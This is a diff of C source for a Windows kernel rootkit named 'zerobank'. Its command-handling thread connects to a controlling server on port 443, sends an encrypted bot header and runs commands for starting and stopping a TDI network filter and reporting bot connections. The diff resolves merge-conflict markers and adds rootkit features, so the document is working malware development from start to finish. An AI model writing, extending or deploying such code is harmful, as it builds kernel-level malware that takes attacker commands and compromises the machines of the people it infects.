@@ -599,14 +599,7 @@ VOID zerobank_communication_worker_thread(PVOID Context)
 
 	connect(&socket, 443, 192, 168, 1, 36, g_ctx->g_Hash);
 
-	// send crypted bot-header, if for some reason sending
-<<<<<<< HEAD
-	// the header fails, theres no point in keep going, so
-	// we return unsuccessful status
-=======
-	// the header fails, theres no point in keep going
->>>>>>> adding files
-
+	// send crypted bot-header
 	if (zerobank_bot_header(socket, g_ctx->g_Hash) == FALSE)
 		return;
 
@@ -706,40 +699,27 @@ VOID zerobank_communication_worker_thread(PVOID Context)
 			break;
 		case ZB_START_TDI_FILTER:
 			KdPrint(("\r\n__rootkit__start__tdi__filter plugin selected"));
+			
+			// Initialize Filter ListHead
+				
+			g_filter_head = (PZEROBANK_FILTER_HEAD)g_ctx->g_Hash->_ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_FILTER_HEAD));
+			InitializeListHead(&g_filter_head->Entry);
+			g_filter_head->NumberOfConnections = 0;
 
-<<<<<<< HEAD
-=======
+				
 			// pass parameters to tdi struct
 			// and start TDI filter thread
 
->>>>>>> adding files
+
 			tdi->Hash = g_ctx->g_Hash;
 			tdi->pDriverObject = g_ctx->pDriverObjectCtx;
 
-			st = g_rk_start_TDI_filter(tdi);
+			st = g_rk_connect_start_filter(tdi);
 			
 
 			break;
 		case ZB_STOP_TDI_FILTER:
 			KdPrint(("\r\n__rootkit__stop__tdi__filter plugin selected"));
-
-<<<<<<< HEAD
-			tdi->Stop = TRUE;
-			tdi->Hash->_KeSetEvent(&tdi->Event, 0, FALSE);
-			tdi->Hash->_KeWaitForSingleObject(tdi->Ethread, Executive, KernelMode, FALSE, NULL);
-			tdi->Hash->_ObfDereferenceObject(tdi->Ethread);
-
-			IoDetachDevice((PDEVICE_OBJECT)g_ctx->pDriverObjectCtx->DeviceObject->DeviceExtension);
-=======
-			// set stop variable to true, set event and wait 
-
-			tdi->Stop = TRUE;
-			tdi->Hash->_KeSetEvent(&tdi->Event, 0, FALSE);
-			tdi->Hash->_KeWaitForSingleObject(tdi->Ethread, Executive, KernelMode, FALSE, NULL);
-			
-			// dereference object
-
-			tdi->Hash->_ObfDereferenceObject(tdi->Ethread);
 
 			// detach device from Tcp
 
@@ -747,8 +727,13 @@ VOID zerobank_communication_worker_thread(PVOID Context)
 			
 			// delete device and clean up
 
->>>>>>> adding files
 			IoDeleteDevice(g_ctx->pDriverObjectCtx->DeviceObject);
+
+			break;
+		case ZB_GET_BOT_CONNECTIONS:
+			KdPrint(("\r\n__rootkit__get__bot__connections plugin selected"));
+
+			g_rk_send_connections_to_userspace(socket, g_ctx->g_Hash);
 
 			break;
 		default:
